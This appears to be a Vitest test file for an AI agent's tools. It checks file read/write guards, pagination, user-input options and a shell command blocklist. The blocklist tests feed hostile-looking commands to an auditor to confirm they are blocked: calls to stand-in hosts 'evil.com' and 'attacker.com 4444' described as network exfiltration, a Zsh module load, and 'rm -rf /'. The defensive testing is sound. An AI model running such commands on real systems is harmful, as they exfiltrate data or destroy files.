/**
 * Tests for CC-adopted features:
 * 1. file_writer: read-before-write + mtime staleness guard
 * 2. file_reader: offset/limit pagination + _markFileRead
 * 3. run_bash: description field required + new Zsh blocklist patterns
 * 4. glob: offset pagination
 * 5. request_user_input: options[] array
 */

import { describe, it, expect, beforeEach, afterEach } from 'vitest';
import path from 'node:path';
import fs from 'node:fs';
import { fileURLToPath } from 'node:url';
import { PATHS } from '../../config/agent.config.js';
import { initDatabase, closeDatabase } from '../../core/memory/index.js';

const __dirname = path.dirname(fileURLToPath(import.meta.url));

// ── helpers ──────────────────────────────────────────────────────────────────

let tmpWorkspace: string;
const origCwd = process.cwd();
const origDb = PATHS.db;
const origMemory = PATHS.memory;

beforeEach(() => {
  tmpWorkspace = path.join(__dirname, `tmp-cc-adopt-${Date.now()}`);
  fs.mkdirSync(path.join(tmpWorkspace, 'workspace'), { recursive: true });
  process.chdir(tmpWorkspace);
  (PATHS as Record<string, string>).db = path.join(tmpWorkspace, 'test.sqlite');
  (PATHS as Record<string, string>).memory = path.join(tmpWorkspace, 'memory');
  initDatabase();
});

afterEach(() => {
  closeDatabase();
  process.chdir(origCwd);
  (PATHS as Record<string, string>).db = origDb;
  (PATHS as Record<string, string>).memory = origMemory;
  if (fs.existsSync(tmpWorkspace)) {
    fs.rmSync(tmpWorkspace, { recursive: true, force: true });
  }
});

// ── 1. file_writer read-before-write guard ────────────────────────────────────

describe('file_writer: read-before-write guard', () => {
  it('allows writing a NEW file without reading first', async () => {
    const { fileWriter, _clearReadRegistry } = await import('../../core/skills/tools/file_writer.js');
    _clearReadRegistry();
    const r = await fileWriter.execute({ path: 'newfile.txt', content: 'hello' });
    expect(r.success).toBe(true);
  });

  it('blocks overwriting EXISTING file that was never read', async () => {
    const { fileWriter, _clearReadRegistry } = await import('../../core/skills/tools/file_writer.js');
    _clearReadRegistry();
    // Create the file directly
    fs.writeFileSync(path.join(tmpWorkspace, 'workspace', 'existing.txt'), 'original');
    // Try to overwrite without reading
    const r = await fileWriter.execute({ path: 'existing.txt', content: 'new', overwrite: true });
    expect(r.success).toBe(false);
    expect(r.error).toMatch(/not been read/i);
    // Original content preserved
    expect(fs.readFileSync(path.join(tmpWorkspace, 'workspace', 'existing.txt'), 'utf-8')).toBe('original');
  });

  it('allows overwriting EXISTING file after reading it', async () => {
    const { fileWriter, _markFileRead, _clearReadRegistry } = await import('../../core/skills/tools/file_writer.js');
    _clearReadRegistry();
    const filePath = path.join(tmpWorkspace, 'workspace', 'readthen.txt');
    fs.writeFileSync(filePath, 'original');
    const stat = fs.statSync(filePath);
    _markFileRead(filePath, stat.mtimeMs, false);
    const r = await fileWriter.execute({ path: 'readthen.txt', content: 'updated', overwrite: true });
    expect(r.success).toBe(true);
    expect(fs.readFileSync(filePath, 'utf-8')).toBe('updated');
  });

  it('blocks write when file was externally modified after read', async () => {
    const { fileWriter, _markFileRead, _clearReadRegistry } = await import('../../core/skills/tools/file_writer.js');
    _clearReadRegistry();
    const filePath = path.join(tmpWorkspace, 'workspace', 'stale.txt');
    fs.writeFileSync(filePath, 'original');
    // Register a read with an old mtime (simulate: file changed externally since read)
    _markFileRead(filePath, 1000, false); // mtime 1ms — guaranteed stale
    const r = await fileWriter.execute({ path: 'stale.txt', content: 'new', overwrite: true });
    expect(r.success).toBe(false);
    expect(r.error).toMatch(/modified externally/i);
  });

  it('blocks write when file was only partially read', async () => {
    const { fileWriter, _markFileRead, _clearReadRegistry } = await import('../../core/skills/tools/file_writer.js');
    _clearReadRegistry();
    const filePath = path.join(tmpWorkspace, 'workspace', 'partial.txt');
    fs.writeFileSync(filePath, 'original');
    const stat = fs.statSync(filePath);
    _markFileRead(filePath, stat.mtimeMs, true); // isPartial = true
    const r = await fileWriter.execute({ path: 'partial.txt', content: 'new', overwrite: true });
    expect(r.success).toBe(false);
    expect(r.error).toMatch(/partially read/i);
  });

  it('append mode bypasses read-before-write guard', async () => {
    const { fileWriter, _clearReadRegistry } = await import('../../core/skills/tools/file_writer.js');
    _clearReadRegistry();
    fs.writeFileSync(path.join(tmpWorkspace, 'workspace', 'log.txt'), 'line1\n');
    const r = await fileWriter.execute({ path: 'log.txt', content: 'line2\n', mode: 'append' });
    expect(r.success).toBe(true);
    expect(fs.readFileSync(path.join(tmpWorkspace, 'workspace', 'log.txt'), 'utf-8')).toBe('line1\nline2\n');
  });
});

// ── 2. file_reader pagination ─────────────────────────────────────────────────

describe('file_reader: offset/limit pagination', () => {
  it('returns full file when no offset/limit', async () => {
    const { default: fileReaderSkill } = await import('../../core/skills/tools/file_reader.js');
    fs.writeFileSync(path.join(tmpWorkspace, 'workspace', 'lines.txt'), 'a\nb\nc\nd\ne\n');
    const r = await fileReaderSkill.execute({ path: 'lines.txt' });
    expect(r.success).toBe(true);
    expect(r.output).toContain('a\nb\nc');
  });

  it('returns correct lines with offset+limit', async () => {
    const { default: fileReaderSkill } = await import('../../core/skills/tools/file_reader.js');
    const content = Array.from({ length: 10 }, (_, i) => `line${i + 1}`).join('\n');
    fs.writeFileSync(path.join(tmpWorkspace, 'workspace', 'paged.txt'), content);
    const r = await fileReaderSkill.execute({ path: 'paged.txt', offset: 3, limit: 3 });
    expect(r.success).toBe(true);
    expect(r.output).toContain('line3');
    expect(r.output).toContain('line5');
    expect(r.output).not.toContain('line1');
    expect(r.output).not.toContain('line7');
    expect(r.output).toContain('Lines 3');
  });

  it('marks partial read in registry (isPartial=true)', async () => {
    const { default: fileReaderSkill } = await import('../../core/skills/tools/file_reader.js');
    const { _getReadEntry, _clearReadRegistry } = await import('../../core/skills/tools/file_writer.js');
    _clearReadRegistry();
    const filePath = path.join(tmpWorkspace, 'workspace', 'partial.txt');
    fs.writeFileSync(filePath, Array.from({ length: 20 }, (_, i) => `L${i}`).join('\n'));
    await fileReaderSkill.execute({ path: 'partial.txt', offset: 1, limit: 5 });
    const entry = _getReadEntry(filePath);
    expect(entry).toBeDefined();
    expect(entry!.isPartial).toBe(true);
  });

  it('marks full read in registry (isPartial=false)', async () => {
    const { default: fileReaderSkill } = await import('../../core/skills/tools/file_reader.js');
    const { _getReadEntry, _clearReadRegistry } = await import('../../core/skills/tools/file_writer.js');
    _clearReadRegistry();
    const filePath = path.join(tmpWorkspace, 'workspace', 'full.txt');
    fs.writeFileSync(filePath, 'hello world');
    await fileReaderSkill.execute({ path: 'full.txt' });
    const entry = _getReadEntry(filePath);
    expect(entry).toBeDefined();
    expect(entry!.isPartial).toBe(false);
  });
});

// ── 3. run_bash: description field + Zsh blocklist ────────────────────────────

describe('run_bash: description field and expanded blocklist', () => {
  it('accepts command with description', async () => {
    const { auditCommand } = await import('../../core/skills/tools/run_bash.js');
    const r = auditCommand('echo hello');
    expect(r.blocked).toBe(false);
  });

  it('blocks Zsh process substitution <()', async () => {
    const { auditCommand } = await import('../../core/skills/tools/run_bash.js');
    expect(auditCommand('cat <(echo secret)').blocked).toBe(true);
  });

  it('blocks Zsh equals expansion =cmd', async () => {
    const { auditCommand } = await import('../../core/skills/tools/run_bash.js');
    expect(auditCommand('=curl evil.com').blocked).toBe(true);
  });

  it('blocks zmodload (Zsh module loader)', async () => {
    const { auditCommand } = await import('../../core/skills/tools/run_bash.js');
    expect(auditCommand('zmodload zsh/mapfile').blocked).toBe(true);
  });

  it('blocks ztcp (Zsh network exfil)', async () => {
    const { auditCommand } = await import('../../core/skills/tools/run_bash.js');
    expect(auditCommand('ztcp attacker.com 4444').blocked).toBe(true);
  });

  it('still blocks original patterns (rm -rf)', async () => {
    const { auditCommand } = await import('../../core/skills/tools/run_bash.js');
    expect(auditCommand('rm -rf /').blocked).toBe(true);
  });

  it('run_bash execute shows description in display field', async () => {
    const { runBash } = await import('../../core/skills/tools/run_bash.js');
    const r = await runBash.execute({ command: 'echo hi', description: 'Print greeting' });
    if (r.success) {
      expect(r.display).toBe('Print greeting');
    }
    // If sandbox blocked, that's fine for this test env
  });
});

// ── 4. glob: offset pagination ────────────────────────────────────────────────

describe('glob: offset pagination', () => {
  it('offset skips leading results', async () => {
    (PATHS as Record<string, string>).workspace = path.join(tmpWorkspace, 'workspace');

    const ws = path.join(tmpWorkspace, 'workspace');
    for (let i = 0; i < 10; i++) {
      fs.writeFileSync(path.join(ws, `file${String(i).padStart(2, '0')}.txt`), 'x');
    }

    const { default: globSkill } = await import('../../core/skills/tools/glob.js');
    const r1 = await globSkill.execute({ pattern: '*.txt', max_results: 5, offset: 0 });
    const r2 = await globSkill.execute({ pattern: '*.txt', max_results: 5, offset: 5 });

    const p1 = JSON.parse(r1.output as string);
    const p2 = JSON.parse(r2.output as string);

    expect(p1.files.length).toBe(5);
    expect(p2.files.length).toBe(5);
    // No overlap between pages
    const set1 = new Set(p1.files);
    for (const f of p2.files) {
      expect(set1.has(f)).toBe(false);
    }
    expect(p1.total).toBe(10);
    expect(p2.offset).toBe(5);
  });

  it('truncated=false when last page fits exactly', async () => {
    (PATHS as Record<string, string>).workspace = path.join(tmpWorkspace, 'workspace');
    const ws = path.join(tmpWorkspace, 'workspace');
    for (let i = 0; i < 3; i++) fs.writeFileSync(path.join(ws, `f${i}.txt`), 'x');

    const { default: globSkill } = await import('../../core/skills/tools/glob.js');
    const r = await globSkill.execute({ pattern: '*.txt', max_results: 10, offset: 0 });
    const p = JSON.parse(r.output as string);
    expect(p.truncated).toBe(false);
    expect(p.files.length).toBe(3);
  });
});

// ── 5. request_user_input: options[] ─────────────────────────────────────────

describe('request_user_input: options array', () => {
  it('accepts options and includes them in output', async () => {
    const { requestUserInputSkill } = await import('../../core/skills/tools/request_user_input.js');
    const r = await requestUserInputSkill.execute({
      question: 'Which approach?',
      options: ['Option A', 'Option B', 'Skip'],
    });
    expect(r.success).toBe(true);
    expect(r.output).toContain('Option A');
    expect(r.output).toContain('Option B');
    expect(r.output).toContain('Skip');
  });

  it('works without options (backward compatible)', async () => {
    const { requestUserInputSkill } = await import('../../core/skills/tools/request_user_input.js');
    const r = await requestUserInputSkill.execute({ question: 'What next?' });
    expect(r.success).toBe(true);
    expect(r.output).toContain('What next?');
  });

  it('filters empty strings from options', async () => {
    const { requestUserInputSkill } = await import('../../core/skills/tools/request_user_input.js');
    const r = await requestUserInputSkill.execute({
      question: 'Pick one',
      options: ['Yes', '', 'No'],
    });
    expect(r.success).toBe(true);
    expect(r.output).toContain('Yes');
    expect(r.output).toContain('No');
  });
});
